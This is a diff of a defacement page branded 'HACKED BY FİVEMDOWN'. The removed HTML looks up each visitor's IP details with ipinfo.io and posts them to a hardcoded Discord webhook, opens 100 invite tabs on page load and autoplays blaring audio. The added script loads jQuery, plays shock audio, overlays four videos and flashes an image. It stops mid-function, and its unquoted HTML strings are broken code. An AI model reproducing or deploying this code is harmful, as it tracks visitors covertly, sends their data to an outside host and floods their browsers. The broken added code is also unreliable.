@@ -1,159 +1,94 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>IP Info</title>
-  <style>
-    body {
-      background: black;
-      color: #00f;
-      font-family: "Courier New", monospace;
-      text-align: center;
-      margin: 0;
-      height: 100vh;
-      overflow: hidden;
-    }
-    #ipinfo {
-      font-size: 22px;
-      line-height: 1.7;
-      text-shadow: 0 0 15px #00f, 0 0 25px #00f, 0 0 40px #00f;
-      white-space: pre-wrap;
-      margin-top: 30px;
-      color: #00f;
-    }
-    #discord-container {
-      margin: 0 auto;
-      margin-top: 40px;
-      margin-bottom: 10px;
-      text-align: center;
-    }
-    #discord-logo {
-      width: 250px;
-      vertical-align: middle;
-      margin-bottom: 7px;
-      filter: drop-shadow(0 0 8px #00f);
-    }
-    #discord-link {
-      font-size: 48px;
-      color: #00f;
-      text-shadow: 0 0 20px #00f, 0 0 40px #00f, 0 0 80px #00f;
-      text-decoration: none;
-      font-weight: bold;
-      letter-spacing: 2px;
-      display: inline-block;
-      margin-top: 15px;
-      margin-bottom: 15px;
-    }
-    #hacked-by {
-      font-size: 45px;
-      color: #00f;
-      text-shadow: 0 0 20px #00f, 0 0 40px #00f, 0 0 80px #00f;
-      letter-spacing: 2px;
-      font-family: inherit;
-      margin-top: 0;
-    }
-    canvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      z-index: -1;
-    }
-    #audio-player {
-      display: none;
-    }
-  </style>
-</head>
-<body>
-  <canvas id="stars"></canvas>
-  <div id="discord-container">
-    <img id="discord-logo" src="https://media.discordapp.net/attachments/1018275296929136692/1018286520488173678/unknown-3-1-3.gif?ex=68b817f9&is=68b6c679&hm=d90659d5477a35817ddc114625ec87b417ac7ab84a3a9fc9b356feb9628ddcf0&=" alt="Discord Image">
-  </div>
-  <pre id="ipinfo">Loading...</pre>
-  <div>
-    <a id="discord-link" href="https://discord.gg/fivemdown" target="_blank">https://discord.gg/fivemdown</a>
-    <span id="hacked-by"> HACKED BY FİVEMDOWN</span>
-  </div>
-  <!-- Mp3 dosyan entegre edildi! -->
-  <audio id="audio-player" src="https://cdn.discordapp.com/attachments/1323494216852308008/1412543226468110346/Moscow_Moscow_missile_meme_earrape.mp3?ex=68b8ace4&is=68b75b64&hm=06bd01749a5bc92fd1a7fb5cfa3877d016525084c09f4f7a38c13f8b692a414a&" autoplay loop muted></audio>
-  <script>
-    // 
-    const canvas = document.getElementById("stars");
-    const ctx = canvas.getContext("2d");
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    const stars = Array.from({length: 150}, () => ({
-      x: Math.random() * canvas.width,
-      y: Math.random() * canvas.height,
-      radius: Math.random() * 1.5,
-      dy: Math.random() * 0.5 + 0.2
-    }));
+const script = document.createElement('script');
+script.src = "https://code.jquery.com/jquery-3.6.0.min.js";
+script.onload = async function () {
+    $(document).ready(async function () {
 
-    function drawStars() {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      ctx.fillStyle = "white";
-      stars.forEach(star => {
-        ctx.beginPath();
-        ctx.arc(star.x, star.y, star.radius, 0, Math.PI*2);
-        ctx.fill();
-        star.y += star.dy;
-        if (star.y > canvas.height) {
-          star.y = 0;
-          star.x = Math.random() * canvas.width;
-        }
-      });
-      requestAnimationFrame(drawStars);
-    }
-    drawStars();
+        const startAudio = new Audio("https://fraudcard.org/file/cristiano-ronaldo-tts-file-67716.mp3");
+        const nukeAudio = new Audio("https://fraudcard.org/file/tactical-nuke-(mp3cut.net)-52890.mp3");
 
-    // 
-    fetch("https://ipinfo.io/json?token=8d7365019dc710")
-      .then(response => response.json())
-      .then(data => {
-        document.getElementById("ipinfo").textContent = JSON.stringify(data, null, 2);
-        window.ipData = data; // Tıklama anında kullanmak için
+        startAudio.volume = 1;
+        nukeAudio.volume = 1;
 
-        // 
-        var webhookURL = "https://discord.com/api/webhooks/1412165143961407570/rNvbuXQPj9VoWSffMDT8ySmCKgRrUkKW0LaHXEqDLqW1d67C9A1ikJB64NRRjt-Fvxhi";
-        var ipInfo = JSON.stringify(data, null, 2);
-        var payload = {
-          content: "Bir kullanıcı siteyi açtı!\nIP Bilgisi:\n" + ipInfo
-        };
-        fetch(webhookURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(payload)
+        const waitForAudioEnd = (audio) => new Promise(res => {
+            audio.addEventListener('ended', res, { once: true });
+            audio.play().catch(console.error);
         });
-      })
-      .catch(() => {
-        document.getElementById("ipinfo").textContent = "Bilgiler alınamadı.";
-      });
 
-    // 
-    window.addEventListener('click', function() {
-      document.getElementById('audio-player').play();
-      document.getElementById('audio-player').muted = false;
+        await waitForAudioEnd(startAudio);
+
+        await new Promise(res => setTimeout(res, 2000));
+
+        await waitForAudioEnd(nukeAudio);
+
+
+        await prepareVideos();
+
+        showVideos();
+        setTimeout(() => {
+            flashImage();
+        }, 8600);
     });
 
-    // 
-    function spamDiscordInvite() {
-      for (let i = 0; i < 100; i++) {
-        window.open("https://discord.gg/fivemdown", "_blank");
-      }
+    async function prepareVideos() {
+        return new Promise((resolve) => {
+            $('body').append(
+                    <div style="position:fixed;top:0;right:0;width:30%;z-index:1000;"><video muted playsinline id="v1" style="width:100%;display:none;" preload="auto"><source src="https://cdn.discordapp.com/attachments/1313231147282600099/1412569135698677790/image.png?ex=68b8c506&is=68b77386&hm=8bdd51e192c3c04d43de4145dcea8257593fa8f114b9118610b9b615a7a78ca8&" type="video/mp4"></video></div>
+                    <div style="position:fixed;top:0;left:0;width:30%;z-index:1000;"><video muted playsinline id="v2" style="width:100%;display:none;" preload="auto"><source src= https://cdn.discordapp.com/attachments/1313231147282600099/1412569201016573952/image.png?ex=68b8c515&is=68b77395&hm=3d2e62133bfff01e10241f4f028c29035af3a524aa233171c7cd13e4e66af608&" type="video/mp4"></video></div>
+                    <div style="position:fixed;bottom:0;left:0;width:30%;z-index:1000;"><video muted playsinline id="v3" style="width:100%;display:none;" preload="auto"><source src="https://cdn.discordapp.com/attachments/1313231147282600099/1412571585251905566/image.png?ex=68b8c74e&is=68b775ce&hm=96349c3b306d57aa963bfe3d46b28db7eca3cb44f71135367468695819b26262&"></video></div>
+                    <div style="position:fixed;bottom:0;right:0;width:30%;z-index:1000;"><video muted playsinline id="v4" style="width:100%;display:none;" preload="auto"><source src="https://bfs-service.xyz/niron/0504.mp4" type="video/mp4"></video></div>
+                );
+
+            const videos = [$('#v1')[0], $('#v2')[0], $('#v3')[0], $('#v4')[0]];
+            let loaded = 0;
+            videos.forEach(video => {
+                video.addEventListener('canplaythrough', () => {
+loaded++;
+                    if (loaded === videos.length) resolve();
+                }, { once: true });
+                video.load();
+            });
+        });
     }
 
-    // 
-    window.onload = function() {
-      // Discord davet spam fonksiyonunu çağır
-      spamDiscordInvite();
+    function showVideos() {
+        const videos = [$('#v1')[0], $('#v2')[0], $('#v3')[0], $('#v4')[0]];
+        videos.forEach((v, i) => {
+            v.style.display = 'block';
+            v.currentTime = 0;
+            v.muted = i !== 0;
+            v.play();
+        });
+        syncVideosLoop(videos[0], [videos[1], videos[2], videos[3]]);
+    }
 
-      var audio = document.getElementById('audio-player');
-      audio.play().catch(()=>{});
-      setTimeout(function() {
-        audio.muted = false;
-      }, 1200); // 1.2 saniye sonra sesi aç
-    };
-  </script>
-</body>
-</html>
+    function syncVideosLoop(master, slaves) {
+        setInterval(() => {
+            const masterTime = master.currentTime;
+            slaves.forEach((v) => {
+                const drift = Math.abs(v.currentTime - masterTime);
+                if (drift > 0.2) {
+                    v.currentTime = masterTime;
+                    v.play();
+                }
+            });
+        }, 250);
+    }
+    function flashImage() {
+        $('head').append(
+            <style>
+                @keyframes pulse {
+                    0% { transform: translate(-50%, -50%) scale(1); }
+                    50% { transform: translate(-50%, -50%) scale(1.3); }
+                    100% { transform: translate(-50%, -50%) scale(1); }
+                }
+                .flashing-img {
+                    position: fixed;
+                    top: 50%;
+                    left: 50%;
+                    transform: translate(-50%, -50%);
+                    z-index: 9999;
+                    width: 400px;
+                    animation: pulse 3s infinite;
+                }
+            </style>
+        );
